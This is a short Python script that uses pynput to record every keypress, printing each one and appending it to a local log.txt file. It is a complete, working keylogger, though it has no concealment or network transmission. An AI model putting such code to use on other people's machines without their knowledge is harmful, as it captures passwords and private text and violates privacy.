from pynput import keyboard



def key_pressed(key):
    #Dealing with virtual keys
    try:
        if key.vk >= 96 and key.vk <= 105:
            key = key.vk - 96
    except:
        pass

    key = str(key).replace("'", "")
    print(key)
    with open("log.txt", "a") as file:
        file.write(key + "\n")


with keyboard.Listener(on_press=key_pressed) as listener:
    listener.join()
